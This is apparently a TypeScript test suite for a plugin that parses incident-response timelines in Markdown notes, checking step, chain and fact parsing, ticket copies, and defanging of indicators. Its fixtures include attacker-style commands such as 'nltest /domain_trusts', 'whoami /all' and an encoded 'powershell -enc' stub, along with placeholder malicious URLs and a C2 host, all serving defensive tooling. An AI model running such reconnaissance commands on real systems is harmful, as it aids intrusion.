      first: '2:29 AM',
      last: '2:41 AM',
      span: '12 min'
    })
  })

  it('gives no gap between two different numeric dates: their order is not in the text', () => {
    const b = block('- On 10/9/26, 23:50 one thing.', '- On 11/9/26, 00:10 another.')
    expect(b.gaps[1]).toBeNull()
    expect(b.summary.span).toBeNull()
  })

  it('reads a year-first slash date as a day', () => {
    const b = block('- 2026/10/09 02:29 the email.')
    expect(b.events[0].time?.date).toEqual({ y: 2026, m: 10, d: 9 })
  })

  it('a date alone is a date with no time', () => {
    const b = block('- On 10/9/26, the vendor account was compromised.')
    expect(b.events[0].time).toMatchObject({ dateText: '10/9/26', minutes: null })
    expect(b.summary.untimed).toBe(1)
  })
})

describe('a list that changes bullet character', () => {
  it('ends where Markdown starts a new list, so Live Preview and Reading view draw the same events', () => {
    const b = findTimelines([TIMELINE_MARKER, '- 11:04 first', '- 11:05 second', '* 11:06 another list'])[0]
    expect(b.events.map((e) => e.text)).toEqual(['11:04 first', '11:05 second'])
    expect(b.lastLine).toBe(2)
  })
})

describe('timeline styles: the marker', () => {
  it('reads the style from the marker line, the style word in any case', () => {
    expect(findTimelines([TIMELINE_MARKER, '- a'])[0].style).toBe('events')
    expect(findTimelines(['%% timeline steps %%', '- a'])[0].style).toBe('steps')
    expect(findTimelines(['  %% timeline chain %%  ', '- a'])[0].style).toBe('chain')
    expect(findTimelines(['%% timeline STEPS %%', '- a'])[0].style).toBe('steps')
    expect(markerStyle('\t%% timeline Chain %%')).toBe('chain')
  })

  it('takes no other timeline comment for a marker', () => {
    for (const line of [
      '%% timeline events %%',
      '%% timeline step %%',
      '%% timeline  steps %%',
      '%%timeline steps%%'
    ]) {
      expect(markerStyle(line)).toBeNull()
      expect(findTimelines([line, '- a'])).toEqual([])
    }
  })

  it('writes the marker for each style, and tells a note that may hold one', () => {
    expect(markerFor('events')).toBe(TIMELINE_MARKER)
    expect(markerFor('steps')).toBe('%% timeline steps %%')
    expect(markerFor('chain')).toBe('%% timeline chain %%')
    expect(mayHoldTimeline('x\n%% timeline chain %%\n- a')).toBe(true)
    expect(mayHoldTimeline('- a\n- b')).toBe(false)
  })

  it('reads the list under every style by the same block rules', () => {
    for (const style of ['steps', 'chain'] as const) {
      const b = findTimelines([markerFor(style), '- one', '    - sub', '', '- two', '', '', '- not in it'])[0]
      expect(b.events.map((e) => e.text)).toEqual(['one', 'two'])
      expect(b.lastLine).toBe(4)
    }
  })

  it('leaves the steps, facts and links of another style empty', () => {
    const [b] = findTimelines(CLICKFIX)
    expect([b.steps, b.facts, b.links]).toEqual([[], [], []])
    const steps = findTimelines(['%% timeline steps %%', '- a', '    - b'])[0]
    expect(steps.links).toEqual([])
    expect(findTimelines(['%% timeline chain %%', '- a'])[0].steps).toEqual([])
  })
})

/** The steps sample from the styles spec. */
const STEPS = [
  '## Alert story',
  '%% timeline steps %%',
  '- 21:34 Alert fired: Potential Recon Activity Via Nltest.EXE',
  '- On host: DESKTOP1.domain.local',
  '- User context: domain\\user1',
  '- Process launch: nltest.exe',
  '- Command executed: nltest /domain_trusts',
  '- Artifact path: C:\\Users\\user1\\Downloads\\',
  '- Details',
  '    - Alert ID: SEC-2023-0704-0001',
  '    - Time: 2023-07-04 21:34 UTC',
  '    - Host: DESKTOP1.domain.local',
  '      192.168.56.95'
]

describe('timeline styles: steps', () => {
  const cut = (lines: string[], line: number, s: { from: number; to: number } | null) =>
    s && lines[line].slice(s.from, s.to)
  const read = (lines: string[]) => {
    const b = findTimelines(lines)[0]
    return b.steps.map((s) => [s.n, cut(lines, s.event.line, s.label), cut(lines, s.event.line, s.value), s.valueKind])
  }

  it('numbers every top-level bullet but the closing Details, with label, value and value kind', () => {
    expect(read(STEPS)).toEqual([
      [1, 'Alert fired', 'Potential Recon Activity Via Nltest.EXE', null],
      [2, 'On host', 'DESKTOP1.domain.local', 'Hostname'],
      [3, 'User context', 'domain\\user1', 'User'],
      [4, 'Process launch', 'nltest.exe', 'File path'],
      [5, 'Command executed', 'nltest /domain_trusts', 'Command line'],
      [6, 'Artifact path', 'C:\\Users\\user1\\Downloads\\', 'File path']
    ])
    const b = findTimelines(STEPS)[0]
    expect(b.steps.map((s) => s.event.line)).toEqual([2, 3, 4, 5, 6, 7])
    expect(b.events).toHaveLength(7)
  })

  it('reads an optional leading time as events do, and nothing when there is none', () => {
    const b = findTimelines(STEPS)[0]
    expect(b.steps[0].event.time).toMatchObject({ raw: '21:34', minutes: 1294 })
    expect(b.steps.slice(1).map((s) => s.event.time)).toEqual([null, null, null, null, null])
    const dated = findTimelines(['%% timeline steps %%', '- On 3 May 2025, 11:04 Login: ok', '- 11:05 Exit: ok'])[0]
    expect(dated.steps[1].event.time).toMatchObject({ date: { y: 2025, m: 5, d: 3 }, minutes: 665 })
  })

  it('splits at the first ": " only after a name; a closing ":" is a label with no value', () => {
    const lines = [
      '%% timeline steps %%',
      '- Note: see below: twice',
      '- https://evil.example/a: was hit',
      '- 10.0.0.1: answered',
      '- the user rang the desk',
      '- Artifact path:',
      '- ',
      '- Execution: ran it',
      '- Command:   whoami /all  '
    ]
    expect(read(lines)).toEqual([
      [1, 'Note', 'see below: twice', null],
      [2, null, 'https://evil.example/a: was hit', null],
      [3, null, '10.0.0.1: answered', null],
      [4, null, 'the user rang the desk', null],
      [5, 'Artifact path', '', null],
      [6, null, '', null],
      [7, 'Execution', 'ran it', null],
      [8, 'Command', 'whoami /all', 'Command line']
    ])
  })

  it('takes the facts from a last Details or Facts bullet, a plain line joining the fact above', () => {
    const b = findTimelines(STEPS)[0]
    const facts = b.facts.map((f) => [
      f.line,
      cut(STEPS, f.line, f.label),
      cut(STEPS, f.line, f.value),
      f.more.map((m) => cut(STEPS, m.line, m.span))
    ])
    expect(facts).toEqual([
      [9, 'Alert ID', 'SEC-2023-0704-0001', []],
      [10, 'Time', '2023-07-04 21:34 UTC', []],
      [11, 'Host', 'DESKTOP1.domain.local', ['192.168.56.95']]
    ])
    expect(b.facts[2].more[0].line).toBe(12)
  })

  it('reads Facts, details and a closing colon in any case; a fact need not have a name', () => {
    for (const word of ['Facts', 'details', 'Details:', 'FACTS:']) {
      const b = findTimelines(['%% timeline steps %%', '- a', `- ${word}`, '    - Host: x', '    - a loose note'])[0]
      expect(b.steps).toHaveLength(1)
      expect(b.facts.map((f) => [f.label === null, f.valueKind])).toEqual([
        [false, null],
        [true, null]
      ])
    }
  })

  it('keeps Details a step when it is not last, or has nothing under it', () => {
    const notLast = findTimelines(['%% timeline steps %%', '- Details', '    - Host: x', '- b'])[0]
    expect([notLast.steps.length, notLast.facts]).toEqual([2, []])
    const bare = findTimelines(['%% timeline steps %%', '- a', '- Details'])[0]
    expect([bare.steps.length, bare.facts]).toEqual([2, []])
    expect(findTimelines(['%% timeline steps %%', '- a', '- Details of the alert', '    - x'])[0].facts).toEqual([])
  })

  it('still counts live indicators on every line for Defang', () => {
    const b = findTimelines([
      '%% timeline steps %%',
      '- Visited: https://evil.example/a',
      '- Details',
      '    - IP: 10.0.0.5'
    ])[0]
    expect(b.summary.live).toBe(2)
  })
})

/** The chain sample from the styles spec. */
const CHAIN = [
  '## Process chain',
  '%% timeline chain %%',
  '- Initial process: cmd.exe',
  '    - Terminal process: nltest.exe',
  '        - User context: domain\\user1',
  '            - Execution: nltest /domain_trusts'
]

describe('timeline styles: chain', () => {
  const cut = (lines: string[], line: number, s: { from: number; to: number } | null) =>
    s && lines[line].slice(s.from, s.to)

  it('reads every bullet as a link, each child under the link above with a smaller indent', () => {
    const b = findTimelines(CHAIN)[0]
    expect(
      b.links.map((l) => [
        l.line,
        l.depth,
        l.parent,
        l.role,
        cut(CHAIN, l.line, l.label),
        cut(CHAIN, l.line, l.value),
        l.valueKind
      ])
    ).toEqual([
      [2, 0, null, 'Root process', 'Initial process', 'cmd.exe', 'File path'],
      [3, 1, 0, 'Spawned child', 'Terminal process', 'nltest.exe', 'File path'],
      [4, 2, 1, 'Spawned child', 'User context', 'domain\\user1', 'User'],
      [5, 3, 2, 'Spawned child', 'Execution', 'nltest /domain_trusts', 'Command line']
    ])
    expect(b.links.map((l) => [l.indent, l.lastLine])).toEqual([
      ['', 5],
      ['    ', 5],
      ['        ', 5],
      ['            ', 5]
    ])
  })

  it('gives siblings one parent, a plain line to the link above as a note, and each subtree its last line', () => {
    const lines = [
      '%% timeline chain %%',
      '- explorer.exe',
      '  - cmd.exe /c a.bat',
      '    started from the Run box',
      '    - whoami',
      '',
      '  - powershell -enc AAA',
      '- services.exe',
      '\t- svchost.exe'
    ]
    const b = findTimelines(lines)[0]
    expect(b.links.map((l) => [l.line, l.depth, l.parent, l.lastLine])).toEqual([
      [1, 0, null, 6],
      [2, 1, 0, 4],
      [4, 2, 1, 4],
      [6, 1, 0, 6],
      [7, 0, null, 8],
      [8, 1, 4, 8]
    ])
    expect(b.links[1].notes).toEqual([{ line: 3, text: 'started from the Run box', source: false }])
    expect(b.links[1].label).toBeNull()
    expect(cut(lines, 2, b.links[1].value)).toBe('cmd.exe /c a.bat')
  })

  it('reads an empty link and keeps code in a link a note', () => {
    const lines = ['%% timeline chain %%', '- ', '  ```', '  - not a link', '  ```', '- [ ] Child: x']
    const b = findTimelines(lines)[0]
    expect(b.links.map((l) => [l.line, l.value.from === l.value.to])).toEqual([
      [1, true],
      [5, false]
    ])
    expect(b.links[0].notes.map((n) => n.line)).toEqual([2, 3, 4])
    expect(cut(lines, 5, b.links[1].label)).toBe('Child')
  })
})

describe('kinds: user and host', () => {
  it.each([
    ['User', 'user'],
    ['Account', 'user'],
    ['Host', 'host'],
    ['Workstation', 'host'],
    ['Endpoint', 'host'],
    ['Server', 'host'],
    ['DEVICE', 'host']
  ])('reads the explicit kind %s', (word, kind) => {
    const e = one(`At 11:06, ${word}: the thing`)
    expect(e).toMatchObject({ kind, kindExplicit: true, body: 'the thing' })
  })

  it.each([
    ['the session ran as domain\\user1', 'user'],
    ['logon by NT AUTHORITY\\SYSTEM.', 'user'],
    ['the account (CORP\\svc_backup$) was used', 'user'],
    ['certutil ran as CORP\\admin', 'execution'],
    ['wrote C:\\Users\\user1\\a.txt', 'file'],
    ['CORP\\bob visited https://evil.example.com/a', 'web'],
    ['mailed bob@corp.example as CORP\\bob', 'email'],
    ['looked in Windows\\Temp', 'observed'],
    ['added to BUILTIN\\Administrators', 'observed']
  ])('derives the kind of "%s"', (bullet, kind) => {
    expect(one(`At 11:00, ${bullet}`)).toMatchObject({ kind, kindExplicit: false })
  })

  it('never derives a host', () => {
    expect(one('At 11:00, the user logged on to DESKTOP1.domain.local').kind).toBe('observed')
  })
})

describe('copyForTicket by style', () => {
  it('copies steps as a numbered list with times, then the facts', () => {
    expect(copyForTicket(findTimelines(STEPS)[0]).split('\n')).toEqual([
      'Steps (6)',
      '1. Alert fired: Potential Recon Activity Via Nltest.EXE (21:34)',
      '2. On host: DESKTOP1.domain.local',
      '3. User context: domain\\user1',
      '4. Process launch: nltest.exe',
      '5. Command executed: nltest /domain_trusts',
      '6. Artifact path: C:\\Users\\user1\\Downloads\\',
      '',
      'Alert ID: SEC-2023-0704-0001',
      'Time: 2023-07-04 21:34 UTC',
      'Host: DESKTOP1.domain.local',
      '      192.168.56.95'
    ])
  })

  it('keeps a step without a label, a label without a value, an approximate time and the details of a step', () => {
    const b = findTimelines(['%% timeline steps %%', '- ~11:04 the user rang', '- Ran:', '    - from the desk'])[0]
    expect(copyForTicket(b).split('\n')).toEqual([
      'Steps (2)',
      '1. the user rang (~11:04)',
      '2. Ran:',
      '   from the desk'
    ])
    expect(copyForTicket(findTimelines(['%% timeline steps %%'])[0])).toBe('Steps (0)')
  })

  it('copies a chain as values with their labels, indented by depth', () => {
    expect(copyForTicket(findTimelines(CHAIN)[0]).split('\n')).toEqual([
      'Process chain (4 links)',
      'cmd.exe (Initial process)',
      '  → nltest.exe (Terminal process)',
      '    → domain\\user1 (User context)',
      '      → nltest /domain_trusts (Execution)'
    ])
    const lines = ['%% timeline chain %%', '- explorer.exe', '  seen at logon', '  - Child:']
    expect(copyForTicket(findTimelines(lines)[0]).split('\n')).toEqual([
      'Process chain (2 links)',
      'explorer.exe',
      '  seen at logon',
      '  → (Child)'
    ])
  })
})

describe('timeline styles: code in a list', () => {
  it('never starts a fact on a line of code', () => {
    const b = findTimelines([
      '%% timeline steps %%',
      '- a',
      '- Facts',
      '    - Cmd:',
      '      ```',
      '      - x',
      '      ```'
    ])[0]
    expect(b.facts.map((f) => [f.labelText, f.more.map((m) => m.text)])).toEqual([['Cmd', ['```', '- x', '```']]])
  })
})

describe('defangTimelineText: a file or an internal host named by itself is no live indicator', () => {
  it('leaves a program, a document or an internal host as written, after a label too, and defangs the rest as defangText does', () => {
    // defangText reads each as a host: the value after 'Label: ', or a code span's whole text.
    for (const line of [
      '- Initial process: cmd.exe',
      '    - Terminal process: nltest.exe',
      '- Parent: explorer.exe',
      '- Dropped: invoice.pdf',
      'payload.dll',
      // An internal name reaches no one outside: the events timeline leaves it as written too.
      '- On host: DESKTOP1.domain.local',
      '- Host: WS01.corp.local:445'
    ]) {
      expect(defangText(line)).not.toBe(line)
      expect(defangTimelineText(line)).toBe(line)
    }
    for (const line of [
      '- On host: DESKTOP1.domain.com',
      '- Fetched: https://evil.example/a.exe',
      '- IP: 10.0.0.5',
      // An extension that is also a top-level domain may name a live site.
      '- Visited: login-microsoft.zip'
    ]) {
      expect(defangText(line)).not.toBe(line)
      expect(defangTimelineText(line)).toBe(defangText(line))
    }
    expect(defangTimelineText('- a: cmd.exe\n- b: 10.0.0.5')).toBe(`- a: cmd.exe\n${defangText('- b: 10.0.0.5')}`)
  })

  it('counts no file and no internal host as a live indicator, in steps and chains', () => {
    const steps = findTimelines([
      '%% timeline steps %%',
      '- Process launch: nltest.exe',
      '- Parent: explorer.exe',
      '- Dropped: invoice.pdf',
      '- On host: DESKTOP1.domain.local',
      '- Beacon: c2.evil.com'
    ])[0]
    expect(steps.summary.live).toBe(1)
    const chain = findTimelines([
      '%% timeline chain %%',
      '- Initial process: cmd.exe',
      '    - Terminal process: nltest.exe'
    ])[0]
    expect(chain.summary.live).toBe(0)
  })
})
